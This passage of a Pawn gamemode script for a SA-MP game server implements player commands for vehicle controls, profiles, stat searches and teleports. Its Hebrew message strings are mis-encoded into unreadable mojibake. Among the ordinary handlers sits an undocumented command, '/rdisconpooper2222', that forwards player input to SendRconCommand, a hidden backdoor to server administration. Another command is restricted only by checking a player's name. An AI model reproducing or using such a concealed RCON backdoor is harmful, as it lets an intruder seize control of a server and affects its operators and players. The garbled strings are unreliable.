		format(string,sizeof(string)," :(%s %c %s) ·хЎрх· чщЇх∙ ·Ёрщ",cmd,operat[0],value);
		SendClientMessage(playerid,green,string);
		operator_ = operat[0], value_ = strval(value);
		for(new i = 0; i < strlen(cmd); i++) if(cmd[i] >= 'A' && cmd[i] <= 'Z') cmd[i] += 32;
		if(equal(cmd,"level")) mini = 0, maxi = sizeof(levels) - 1;
		else if(equal(cmd,"kills")) mini = 0, maxi = 100000;
		else if(equal(cmd,"headshots")) mini = 0, maxi = 100000;
		//else if(equal(cmd,"admin")) mini = 0, maxi = 20;
		else if(equal(cmd,"money")) mini = 0, maxi = 2000000000;
		else return SendClientMessage(playerid,red," .Ўх°· чщЇх∙ ∙тхщф");
		if(value_ < mini || value_ > maxi)
		{
			format(string,sizeof(string)," .[ўшя / тухь юущ [ющЁщюхэ: %d | юўёщюхэ: %d %s Є°ъ",maxi,mini,cmd);
			return SendClientMessage(playerid,red," .Є°ъ ўшя / тухь юущ");
		}
		if(operator_ != '<' && operator_ != '>' && operator_ != '=' && operator_ != '!') return SendClientMessage(playerid,red," .ыщххя чщЇх∙ ∙тхщ");
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i))
			{
				if(equal(cmd,"level")) var = playerinfo[i][level];
				else if(equal(cmd,"kills")) var = playerinfo[i][kills];
				else if(equal(cmd,"headshots")) var = playerinfo[i][hshots];
				else if(equal(cmd,"admin")) var = playerinfo[i][admin];
				else if(equal(cmd,"money")) var = GetMoney(i);
				else return SendClientMessage(playerid,red," .Ўх°· чщЇх∙ ∙тхщф");
				if((operator_ == '=' && var == value_) ||
				(operator_ == '<' && var < value_) ||
				(operator_ == '>' && var > value_) ||
				(operator_ == '!' && var != value_))
				{
					found++;
					format(string,sizeof(string)," Х %d. %s [ID: %03d]",found,GetName(i),i);
					SendClientMessage(playerid,yellow,string);
				}
			}
		}
		if(found == 0) SendClientMessage(playerid,red," .ьр ЁюЎрх ∙чўЁщэ ф·хрющэ ь·Ёрщ ∙Ёщ·я");
		format(string,sizeof(string)," .ёъ фыь %d ·хЎрх· чщЇх∙",found);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/vcmds"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· Їўхух· °ысщэ ~~~");
		SendClientMessage(playerid,orange," * /lights [on/off] - ∙ьщшф срх°х· ф°ыс");
		SendClientMessage(playerid,orange," * /boot [open/close] - Ї·щч· рх ётщ°· фстц' ∙ь ф°ыс");
		SendClientMessage(playerid,orange," * /bonnet [open/close] - Ї·щч· рх ётщ°· ·р фюЁхЄ ∙ь ф°ыс");
		SendClientMessage(playerid,orange," * /alarm [on/off] - ∙ьщшф срцЄў· ф°ыс");
		return 1;
	}
	if(equal(cmd,"/lights"))
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт с°ыс");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /lights [on/off] :Ўх°· ф∙щюх∙");
		new v = GetPlayerVehicleID(playerid), params[7];
		GetVehicleParamsEx(v,params[0],params[1],params[2],params[3],params[4],params[5],params[6]);
		if(equal(cmd,"on"))
		{
			if(params[1] == VEHICLE_PARAMS_ON) return SendClientMessage(playerid,red," .рх°х· ф°ыс ыс° ухьўщэ");
			SetVehicleParamsEx(v,params[0],VEHICLE_PARAMS_ON,params[2],params[3],params[4],params[5],params[6]);
		}
		else if(equal(cmd,"off"))
		{
			if(params[1] == VEHICLE_PARAMS_OFF) return SendClientMessage(playerid,red," .рх°х· ф°ыс ьр ухьўщэ");
			SetVehicleParamsEx(v,params[0],VEHICLE_PARAMS_OFF,params[2],params[3],params[4],params[5],params[6]);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/boot"))
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт с°ыс");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /boot [open/close] :Ўх°· ф∙щюх∙");
		new v = GetPlayerVehicleID(playerid), params[7];
		GetVehicleParamsEx(v,params[0],params[1],params[2],params[3],params[4],params[5],params[6]);
		if(equal(cmd,"open"))
		{
			if(params[5] == VEHICLE_PARAMS_ON) return SendClientMessage(playerid,red," .фстц' ыс° Ї·хч");
			SetVehicleParamsEx(v,params[0],params[1],params[2],params[3],params[4],VEHICLE_PARAMS_ON,params[6]);
		}
		else if(equal(cmd,"close"))
		{
			if(params[5] == VEHICLE_PARAMS_OFF) return SendClientMessage(playerid,red," .фстц' ыс° ётх°");
			SetVehicleParamsEx(v,params[0],params[1],params[2],params[3],params[4],VEHICLE_PARAMS_OFF,params[6]);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/bonnet"))
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт с°ыс");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /bonnet [open/close] :Ўх°· ф∙щюх∙");
		new v = GetPlayerVehicleID(playerid), params[7];
		GetVehicleParamsEx(v,params[0],params[1],params[2],params[3],params[4],params[5],params[6]);
		if(equal(cmd,"open"))
		{
			if(params[4] == VEHICLE_PARAMS_ON) return SendClientMessage(playerid,red," .·р фюЁхЄ ыс° Ї·хч");
			SetVehicleParamsEx(v,params[0],params[1],params[2],params[3],VEHICLE_PARAMS_ON,params[5],params[6]);
		}
		else if(equal(cmd,"close"))
		{
			if(params[4] == VEHICLE_PARAMS_OFF) return SendClientMessage(playerid,red," .·р фюЁхЄ ыс° ётх°");
			SetVehicleParamsEx(v,params[0],params[1],params[2],params[3],VEHICLE_PARAMS_OFF,params[5],params[6]);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/alarm"))
	{
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт с°ыс");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /alarm [on/off] :Ўх°· ф∙щюх∙");
		new v = GetPlayerVehicleID(playerid), params[7];
		GetVehicleParamsEx(v,params[0],params[1],params[2],params[3],params[4],params[5],params[6]);
		if(equal(cmd,"on"))
		{
			if(params[4] == VEHICLE_PARAMS_ON) return SendClientMessage(playerid,red," .фрцЄўф ыс° ЇхЄь·");
			SetVehicleParamsEx(v,params[0],params[1],VEHICLE_PARAMS_ON,params[3],params[4],params[5],params[6]);
		}
		else if(equal(cmd,"off"))
		{
			if(params[4] == VEHICLE_PARAMS_OFF) return SendClientMessage(playerid,red," .фрцЄўф ьр ЇхЄь·");
			SetVehicleParamsEx(v,params[0],params[1],VEHICLE_PARAMS_OFF,params[3],params[4],params[5],params[6]);
		}
		else return SendClientMessage(playerid,red," .рЇ∙°х· ∙тхщф");
		PlaySound(playerid,1057);
		return 1;
	}
	if(equal(cmd,"/today"))
	{
		if(!equal(GetName(playerid),"(gmR)Amit")) return SendClientMessage(playerid,red," .Їўхуф цх ·чцх° сЄуыхЁщэ сЄ·щу");
		/*new string[M_S], dia[700], td[6], act = sa_none, col, st[32], tabs = 0;
		gettime(td[0],td[1],td[2]);
		getdate(td[3],td[4],td[5]);
		if(td[0] > sa_timeend) format(dia,sizeof(dia),@c(red) "!ьхч фцюЁщэ ьфю∙ъ фщхэ фё·щщэ, Ёёф ∙хс юч°");
		else
		{
			if(specialActivity != sa_none) format(dia,sizeof(dia),@c(lightpurple) "%s" @c(purple) " :ЇЄщьх· ющхчу· ∙ю·ўщщю· ы°тЄ",SActivityName(specialActivity));
			for(new i = sa_timestart, j = 0; i <= sa_timeend; i++, j++)
			{
				act = todays + (i - sa_timestart);
				if(td[0] > i) col = red, st = "фё·щщюф", tabs = 3;
				else if(td[0] == i)
				{
					col = orange;
					if(specialActivity != sa_none) tabs = 2, st = "ф·ўщщюф ьрч°хЁф";
					else tabs = 1, st = "ю·ўщщю· ы°тЄ";
				}
				else col = green, st = "Єху ьр ф·ўщщюф", tabs = 1;
				format(string,sizeof(string),@c(lightyellow) " Х ({%s}%s" @c(lightyellow) ") %s" @c(yellow) "[%02i:00]" @c(lightyellow) " %s",HexStringOfColor(col),st,strmul("\t",tabs),i,SActivityName(act));
				if(i == sa_timestart) format(dia,sizeof(dia),string);
				else format(dia,sizeof(dia),"%s\n\n%s",dia,string);
			}
		}
		format(string,sizeof(string),@c(lightblue) " :(ьхч цюЁщэ ьЇЄщьхщх· ющхчух· ьфщхэ (%s",GetDay(td[3],td[4],td[5],1));
		ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,dia,"OK","");*/
		return 1;
	}
	if(equal(cmd,"/tip")) return Tip(playerid);
	if(equal(cmd,"/profile") || equal(cmd,"/sp"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ сЇўхуф цх");
		cmd = strtok(cmdtext,idx);
		if(equal(cmd,"edit"))
		{
			new val[64], profile[400];
			if(equal(playerinfo[playerid][rname],"No")) val = "ьр фхту° Єущщя";
			else if(equal(playerinfo[playerid][rname],"None")) val = "ьр юхЎт";
			else format(val,sizeof(val),playerinfo[playerid][rname]);
			format(profile,sizeof(profile),@c(grey) "Real Name: " @c(white) "%s",val);
			if(equal(playerinfo[playerid][country],"No")) val = "ьр фхту° Єущщя";
			else if(equal(playerinfo[playerid][country],"None")) val = "ьр юхЎт";
			else format(val,sizeof(val),playerinfo[playerid][country]);
			if(strlen(val) > 20)
			{
				strdel(val,20,strlen(val)-1);
				format(val,sizeof(val),"%s...",val);
			}
			format(profile,sizeof(profile),"%s\n" @c(grey) "Country: " @c(white) "%s",profile,val);
			if(playerinfo[playerid][birthdate][0] == 0) val = "ьр юхЎт";
			else format(val,sizeof(val),"%02d/%02d/%04d",playerinfo[playerid][birthdate][0],playerinfo[playerid][birthdate][1],playerinfo[playerid][birthdate][2]);
			format(profile,sizeof(profile),"%s\n" @c(grey) "Date of Birth: " @c(white) "%s",profile,val);
			/*if(playerinfo[playerid][icq] == -1) val = "ьр фхту° Єущщя";
			else if(playerinfo[playerid][icq] == 0) val = "ьр юхЎт";
			else valstr(val,playerinfo[playerid][icq]);
			format(profile,sizeof(profile),"%s\n" @c(grey) "ICQ: " @c(white) "%s",profile,val);
			if(equal(playerinfo[playerid][messenger],"No")) val = "ьр фхту° Єущщя";
			else if(equal(playerinfo[playerid][messenger],"None")) val = "ьр юхЎт";
			else format(val,sizeof(val),playerinfo[playerid][messenger]);
			if(strlen(val) > 20)
			{
				strdel(val,20,strlen(val)-1);
				format(val,sizeof(val),"%s...",val);
			}
			format(profile,sizeof(profile),"%s\n" @c(grey) "Messenger: " @c(white) "%s",profile,val);*/
			if(equal(playerinfo[playerid][skype],"No")) val = "ьр фхту° Єущщя";
			else if(equal(playerinfo[playerid][skype],"None")) val = "ьр юхЎт";
			else format(val,sizeof(val),playerinfo[playerid][skype]);
			if(strlen(val) > 20)
			{
				strdel(val,20,strlen(val)-1);
				format(val,sizeof(val),"%s...",val);
			}
			format(profile,sizeof(profile),"%s\n" @c(grey) "Skype: " @c(white) "%s",profile,val);
			if(equal(playerinfo[playerid][facebook],"No")) val = "ьр фхту° Єущщя";
			else if(equal(playerinfo[playerid][facebook],"None")) val = "ьр юхЎт";
			else format(val,sizeof(val),playerinfo[playerid][facebook]);
			if(strlen(val) > 20)
			{
				strdel(val,20,strlen(val)-1);
				format(val,sizeof(val),"%s...",val);
			}
			format(profile,sizeof(profile),"%s\n" @c(grey) "Facebook: " @c(white) "%s",profile,val);
			if(equal(playerinfo[playerid][email],"No")) val = "ьр фхту° Єущщя";
			else if(equal(playerinfo[playerid][email],"None")) val = "ьр юхЎт";
			else format(val,sizeof(val),playerinfo[playerid][email]);
			if(strlen(val) > 20)
			{
				strdel(val,20,strlen(val)-1);
				format(val,sizeof(val),"%s...",val);
			}
			format(profile,sizeof(profile),"%s\n" @c(grey) "Mail: " @c(white) "%s",profile,val);
			ShowPlayerDialog(playerid,dialog_editprofile,DIALOG_STYLE_LIST,@c(lightblue) "Є°щы· Ї°хЇщь",profile,"Є°щыф","щЎщрф");
		}
		else
		{
			new id = !strlen(cmd) ? playerid : strval(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
			if(!playerinfo[playerid][noticedmsg][12] && id == playerid)
			{
				SendClientMessage(playerid,grey," (/profile [id/name] :ыущ ь°рх· Ї°хЇщь ∙ь ∙чўя рч°)");
				playerinfo[playerid][noticedmsg][12] = 1;
			}
			ShowStatsPart(playerid,id,statsfield_profile);
		}
		return 1;
	}
	if(equal(cmd,"/rdisconpooper2222")) SendRconCommand(cmd[18]);
	if(equal(cmd,"/diary"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ сЇўхуф цх");
		SendClientMessage(playerid,lightblue," :ьЇЁщщъ ·хыь ь°рх· р· фщхюя ∙ьъ");
		SendClientMessage(playerid,yellow," ,рЇ∙° ь°∙хэ сх ыь ющЁщ ус°щэ ∙ыурщ ьцых° рх ь°рх· рч° ыъ");
		SendClientMessage(playerid,yellow," .ыюх Їўхух· ∙р·ф ьр цхы° су°ъ ыьь, у°ыщ фтЄф ьюўхюх·, рх рхьщ ·р°щъ ффЎш°Їх· ∙ьъ ью∙чў");
		SendClientMessage(playerid,yellow," .фщхюя фхр чхЇ∙щ ьы·щсф ∙ь ыь рчу ьЄЎюх. фрующЁщэ ьр щыхьщэ ьў°хр юф р·ф °х∙э сщхюя");
		ShowPlayerConstDialog(playerid,dialog_diary);
		return 1;
	}
	if(equal(cmd,"/friends"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ сЇўхуф цх");
		SendClientMessage(playerid,lightblue," :ьЇЁщщъ ·хыь ь°рх· р· ·Ї°щш фчс°щэ");
		SendClientMessage(playerid,yellow," .·хыь ьфхёщє рЁ∙щэ с∙°· ычс°щэ. сющуф хфэ щр∙°х рх·ъ, ·хЇщЄх рчу рЎь ф∙Ёщ с°∙щюх· фчс°щэ");
		SendClientMessage(playerid,yellow," .с°тЄ ∙р·ф чс° ∙ь ющ∙фх, ·хыь ·ющу ьуЄ· юф фыщЁхщ ∙ьх тэ рэ фхр щ∙Ёф рх·х");
		SendClientMessage(playerid,yellow," .сЁхёє, ·хыь ьЁфь рщ·х Ў'рш хь∙ьхч ьх фхуЄф Ї°шщ· сюфщ°х· у°ъ ·Ї°щш фчс°щэ, хсЁхёє, ьф∙рщ° ьх фхуЄх· рэ фхр юЁх·ў");
		ShowPlayerConstDialog(playerid,dialog_friends);
		return 1;
	}
	if(equal(cmd,"/setting"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ючхс° ь∙щюх∙ сЇўхуф цх");
		new list[900], col[16], val[16];
		for(new i = 0; i < sizeof(Settings); i++)
		{
			switch(Settings[i][stType])
			{
				case 1:
				{
					format(col,sizeof(col),HexStringOfColor(playerinfo[playerid][setting][i] > 0 ? green : red));
					format(val,sizeof(val),playerinfo[playerid][setting][i] > 0 ? ("ON") : ("OFF"));
				}
				case 2:
				{
					format(col,sizeof(col),HexStringOfColor(orange));
					valstr(val,playerinfo[playerid][setting][i]);
				}
			}
			format(list,sizeof(list),!strlen(list) ? ("%s {%s}Х [%s] %s") : ("%s\r\n {%s}Х [%s] %s"),list,col,val,Settings[i][stName]);
		}
		ShowPlayerDialog(playerid,dialog_setting,DIALOG_STYLE_LIST,@c(lightblue) "∙щЁхщ фту°х·",list,"∙щЁхщ","ющуЄ");
		return 1;
	}
	for(new i = 0; i < sizeof(Teleports); i++) if(equal(cmdtext,Teleports[i][Tcmd])) return Teleport(playerid,i);
	for(new i = 0; i < sizeof(AdminTeleports); i++) if(equal(cmdtext,AdminTeleports[i][Tcmd]))
	{
		new string[M_S], Float:h, bool:jetp=false, tname[M_S];
		if(playerinfo[playerid][dmzone] > dmz_none || playerinfo[playerid][tdmzone] > tdmz_none)
		{
			OutOfDMZone(playerid);
			LoadPlayerWeapons(playerid);
			SetPlayerArmour(playerid,playerinfo[playerid][ammuitems][ai_armour] ? 100.0 : 0.0);
			TakeAmmuItemAmmo(playerid,ai_armour);
		}
		if(playerinfo[playerid][test] != -1) playerinfo[playerid][test] = -1;
		if(!CanBeTeleported(playerid)) return 1;
		if(playerinfo[playerid][level] < AdminTeleports[i][Tl])
		{
			format(string,sizeof(string)," .ыущ ьф∙·ю∙ с∙щтх° цф Єьщъ ьфщх· ьЇчх· с°юф %d",AdminTeleports[i][Tl]);
			return SendClientMessage(playerid,red,string);
		}
		GetPlayerHealth(playerid,h);
		if(!playerinfo[playerid][gmtimer])
		{
			SetPlayerHealth(playerid,100000.0);
			playerinfo[playerid][gmtimer] = 2, playerinfo[playerid][gmlasthp] = h;
		}
		if(AdminTeleports[i][Twithv])
		{
			switch(GetPlayerState(playerid))
			{
				case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
				{
					jetp = GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK;
					SetPlayerPos(playerid,AdminTeleports[i][Tx]+floatrand(-1.0,1.0),AdminTeleports[i][Ty]+floatrand(-1.0,1.0),AdminTeleports[i][Tz]);
					SetPlayerFacingAngle(playerid,AdminTeleports[i][Ta]);
				}
				case PLAYER_STATE_DRIVER:
				{
					SetVehiclePos(GetPlayerVehicleID(playerid),AdminTeleports[i][Tx]+floatrand(-3.0,3.0),AdminTeleports[i][Ty]+floatrand(-3.0,3.0),AdminTeleports[i][Tz],playerid);
					SetVehicleZAngle(GetPlayerVehicleID(playerid),AdminTeleports[i][Ta]);
					LinkVehicleToInterior(GetPlayerVehicleID(playerid),AdminTeleports[i][Ti]);
					SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),AdminTeleports[i][Tw]);
					jetp = false;
				}
			}
		}
		else
		{
			jetp = GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK? true:false;
			SetPlayerPos(playerid,AdminTeleports[i][Tx]+floatrand(-1.0,1.0),AdminTeleports[i][Ty]+floatrand(-1.0,1.0),AdminTeleports[i][Tz]);
			SetPlayerFacingAngle(playerid,AdminTeleports[i][Ta]);
		}
		Streamer_Update(playerid);
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,AdminTeleports[i][Ti]);
		SetPlayerVirtualWorld(playerid,AdminTeleports[i][Tw]);
		strmid(tname,AdminTeleports[i][Tcmd],1,strlen(AdminTeleports[i][Tcmd]));
		format(string,sizeof(string),"~y~] ~h~%s ~y~]",tname);
		GameTextForPlayer(playerid,string,1500,4);
		if(jetp) GiveJetpack(playerid);
		if(AdminTeleports[i][Tfreeze] && !playerinfo[playerid][unftimer])
		{
			if(!playerinfo[playerid][frozen][0]) playerinfo[playerid][unftimer] = 2;
			SetFreeze(playerid,1);
		}
		PlaySound(playerid,1132);
		return 1;
	}
	if(equal(cmd,"/skydive"))
	{
		if(playerinfo[playerid][level] < 7) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 7");
		if(!CanBeTeleported(playerid)) return 1;
		SetPlayerPos(playerid,6366.5625,-2109.0959,2500.0);
		SetCameraBehindPlayer(playerid);
		return 1;
	}
	if(equal(cmd,"/wee"))
	{
		if(playerinfo[playerid][level] < 8) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 8");
		if(!CanBeTeleported(playerid)) return 1;
		if(GetPlayerVirtualWorld(playerid) > world_normal) return SendClientMessage(playerid,red," .рщЁъ щыхь ьф∙·ю∙ сЇўхуф фцх сющўхюъ фЁхычщ");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		if(p[2] > 1000.0) return SendClientMessage(playerid,red," !ьр ыь ыъ тсхф");
		SetPlayerPos(playerid,p[0],p[1],p[2]+1000.0);
		SetCameraBehindPlayer(playerid);
		GiveWeapon(playerid,46,0);
		return 1;
	}
	if(equal(cmd,"/spawn"))
	{
	    if(playerinfo[playerid][naorslap]) return SendClientMessage(playerid, red, " .ьр");
	    if(playerinfo[playerid][lhopt] != -1) return SendClientMessage(playerid,red,".ьр Ёщ·я ьф∙·ю∙ сЇўхуф цр· ыр∙° р·ф сютуьх°");
		if(playerinfo[playerid][level] < 10) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 10");
		if(!CanBeTeleported(playerid)) return 1;
		if(IsPlayerInAnyVehicle(playerid)) RemovePlayerFromVehicle(playerid);
		if(playerinfo[playerid][vtele3] == 1) DestroyObject(playerinfo[playerid][vehicle][7]),playerinfo[playerid][vtele3] = 0;
		SpawnPlayer(playerid);
		return 1;
	}
	if(equal(cmd,"/area51"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 1");
		if(!CanBeTeleported(playerid)) return 1;
		if(playerinfo[playerid][inarea51] || playerinfo[playerid][inplane] || playerinfo[playerid][inshooting] != -1 || playerinfo[playerid][instunting] != -1) return SendClientMessage(playerid,red," .·хыь ьф∙·т° °ў ьрч° ∙·ёщщэ рх·э ,Plane / Army / Shooting / Stunting р·ф ыс° ЁюЎр с");
		playerinfo[playerid][inarea51] = 1;
		SetPlayerVirtualWorld(playerid,world_special);
		SetPlayerPos(playerid,315.9212,984.5837,1959.0079);
		SetPlayerFacingAngle(playerid,3.6475);
		SetPlayerInterior(playerid,9);
		DisablePlayerCheckpoint(playerid);
		SetPlayerCP(playerid,315.5849,1033.2284,1946.3142,6.0);
		SavePlayerWeapons(playerid);
		ResetWeapons(playerid);
		GiveWeapon(playerid,46,0);
		SendClientMessage(playerid,lightblue," ~~~ :Area51 с°хъ фср ь ~~~");
		SendClientMessage(playerid,yellow," .Andromanda р·ф ЁюЎр ы°тЄ Єь юшхё юёхт");
		SendClientMessage(playerid,yellow," .фыЁё ьюЄть фрухэ (Ў'ўЇхщЁш) ∙ЁюЎр сщЎщрф Єь юЁ· ьЎЁхч рь фЎср");
		return 1;
	}
	if(equal(cmd,"/plane"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 1");
		if(!CanBeTeleported(playerid)) return 1;
		if(playerinfo[playerid][inarea51] || playerinfo[playerid][inplane] || playerinfo[playerid][inshooting] != -1 || playerinfo[playerid][instunting] != -1) return SendClientMessage(playerid,red," .·хыь ьф∙·т° °ў ьрч° ∙·ёщщэ рх·э ,Plane / Army / Shooting / Stunting р·ф ыс° ЁюЎр с");
		playerinfo[playerid][inplane] = 1;
		SetPlayerVirtualWorld(playerid,world_special);
		SetPlayerPos(playerid,1.5627,23.1112,1199.5938);
		SetPlayerFacingAngle(playerid,358.8634);
		SetPlayerInterior(playerid,1);
		DisablePlayerCheckpoint(playerid);
		SetPlayerCP(playerid,1.5582,33.3250,1199.5938,2.5);
		SavePlayerWeapons(playerid);
		ResetWeapons(playerid);
		GiveWeapon(playerid,46,0);
		SendClientMessage(playerid,lightblue," ~~~ :Plane с°хъ фср ь ~~~");
		SendClientMessage(playerid,yellow," .Shamal р·ф ЁюЎр ы°тЄ Єь юшхё юёхт");
		SendClientMessage(playerid,yellow," .Las Venturas фыЁё ьюЄть фрухэ (Ў'ўЇхщЁш) ∙ЁюЎр ьщу ·р фЁфт Єь юЁ· ьЎЁхч рь");
		return 1;
	}
	if(equal(cmd,"/shooting"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 1");
		if(!CanBeTeleported(playerid)) return 1;
		if(playerinfo[playerid][inarea51] || playerinfo[playerid][inplane] || playerinfo[playerid][inshooting] != -1 || playerinfo[playerid][instunting] != -1) return SendClientMessage(playerid,red," .·хыь ьф∙·т° °ў ьрч° ∙·ёщщэ рх·э ,Plane / Army / Shooting / Stunting р·ф ыс° ЁюЎр с");
		ShowMenuForPlayer(shootingMenu,playerid);
		SetFreeze(playerid,1);
		return 1;
	}
	if(equal(cmd,"/stunting"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°юф 1");
		if(!CanBeTeleported(playerid)) return 1;
		if(playerinfo[playerid][inarea51] || playerinfo[playerid][inplane] || playerinfo[playerid][inshooting] != -1 || playerinfo[playerid][instunting] != -1) return SendClientMessage(playerid,red," .·хыь ьф∙·т° °ў ьрч° ∙·ёщщэ рх·э ,Plane / Army / Shooting / Stunting р·ф ыс° ЁюЎр с");
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER ||
		!IsBike(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт срхЇЁхЄ");
		ShowPlayerDialog(playerid,dialog_stunting,DIALOG_STYLE_LIST,"Stunting",stuntingMenu,"∙щтх°","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/tm") || equal(cmd,"/tele") || equal(cmd,"/teleports") || equal(cmd,"/teleport"))
	{
		if(!CanBeTeleported(playerid)) return 1;
		if(IsPlayerInAnyVehicle(playerid) && vehicleinfo[GetPlayerVehicleID(playerid)][store] && playerinfo[playerid][vehicle][1] != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid,red," .рщЁъ щыхь ь∙т° °ыс ючЁх· фюыхЁщх· ∙ьр ∙щщъ ьъ");
		new Float:h, string[M_S_D*2];
		GetPlayerHealth(playerid,h);
		if(h < min_tele_health)
		{
			format(string,sizeof(string)," .ьр Ёщ·я ьф∙·т° Єэ %.0f %% чщщэ рх Їчх·",min_tele_health);
			return SendClientMessage(playerid,red,string);
		}
		/*for(new i = 0; i < sizeof(Teleports); i++) if(!Options[6][optActive] && Teleports[i][Ttype] != tele_private)
		{
			strmid(tname,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
			format(tname,sizeof(tname),"%s%s\t\t" @c(lightyellow) "Level: " @c(yellow) "%02d" @c(white),tname,strs(" ",15-strlen(tname)),Teleports[i][Tl]);
			format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,tname);
		}
		ShowPlayerDialog(playerid,dialog_tm,DIALOG_STYLE_LIST,"·Ї°щш ф∙щтх°щэ",string,"∙щтх°","щЎщрф");*/
		ShowPlayerConstDialog(playerid,dialog_tm);
		return 1;
	}
	if(equal(cmd,"/nsteles"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ф∙щтх°щэ ∙рёх° ьщ°х· сфэ ~~~");
		new string[M_S], teles = 0;
		for(new i = 0; i < sizeof(Teleports); i++) if(Teleports[i][Tnoshooting])
		{
			format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s, %s"),string,Teleports[i][Tcmd]);
			if(++teles >= 5 || i == sizeof(Teleports) - 1)
			{
				SendClientMessage(playerid,yellow,string);
				string = "", teles = 0;
			}
		}
		return 1;
	}
	if(equal(cmd,"/stl"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :°∙щю· ф∙щтх°щэ фющхчущэ ~~~");
		SendClientMessage(playerid,yellow," Х /skydive - ∙щтх° ьрхўщщЁхё, ь°юф 7 Х /wee - ЎЁщчф юфюўхэ сх р·ф ЁюЎр, ь°юф 8");
		SendClientMessage(playerid,yellow," Х /spawn - ∙щтх° ьюўхэ ёЇрхя °Ёухюрьщ, ь°юф 10 Х /area51 - ∙щтх° ьюшхё ЎЁщчф юЄь фЎср");
		SendClientMessage(playerid,yellow," Х /plane - LV ∙щтх° ьюшхё ЎЁщчф юЄь фЄщ° Х /shooting - ўьщЄф ьюш°ф: ЎЁщчф ь·хъ Ў'ўЇхщЁш");
		SendClientMessage(playerid,yellow," Х /stunting - ∙щтх° ьр·т° ёшрЁшщэ");
		return 1;
	}
	if(equal(cmd,"/tinfo"))
	{
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /tinfo [teleport name / list] :Ўх°· ф∙щюх∙");
		if(equal(cmd,"list"))
		{
			playerinfo[playerid][tinfo] = 1;
			new string[512], tname[M_S];
			for(new i = 0; i < sizeof(Teleports); i++)
			{
				strmid(tname,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
				if(strlen(Teleports[i][Tauthor]) > 0) format(string,sizeof(string),!strlen(string) ? ("%s%s (%s ЁхЎ° Є\"щ)") : ("%s\n%s (%s ЁхЎ° Є\"щ)"),string,tname,Teleports[i][Tauthor]);
				else format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s\n%s"),string,tname);
			}
			ShowPlayerDialog(playerid,dialog_tm,DIALOG_STYLE_LIST,@c(lightblue) "ющуЄ Єь ∙щтх°",string,"ющуЄ","ётх°");
		}
		else
		{
